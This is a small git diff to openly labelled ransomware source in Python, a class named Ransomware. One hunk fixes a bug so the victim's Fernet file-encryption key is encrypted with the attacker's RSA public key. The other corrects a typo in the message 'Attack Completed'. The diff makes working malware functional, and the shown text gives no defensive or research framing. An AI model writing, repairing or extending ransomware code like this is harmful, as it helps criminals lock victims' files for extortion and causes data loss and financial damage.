@@ -57,7 +57,7 @@ class Ransomware:
 
 		with open("fernet_key.txt") as f:
 			self.public_key=RSA.importKey(open('public.pem').read()) # Import RSA Public Key Of Attacker
-			public_encryptor=PKCS1_OAEP.new(public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
+			public_encryptor=PKCS1_OAEP.new(self.public_key) #Return a cipher object PKCS1OAEP_Cipher that can be used to perform PKCS#1 OAEP encryption or decryption
 			enc_fernet_key=public_encryptor.encrypt(fernet_key) #encrypt fernet key with public key
 			f.write(enc_fernet_key) # Write Out The Contents Of The Text File With Encrypted Text
 
@@ -170,4 +170,4 @@ if __name__ == '__main__':
 	t1.start()
 	print(" > Target Encrypted")
 	t2.start()
-	print(" > Attak Completed")
+	print(" > Attack Completed")
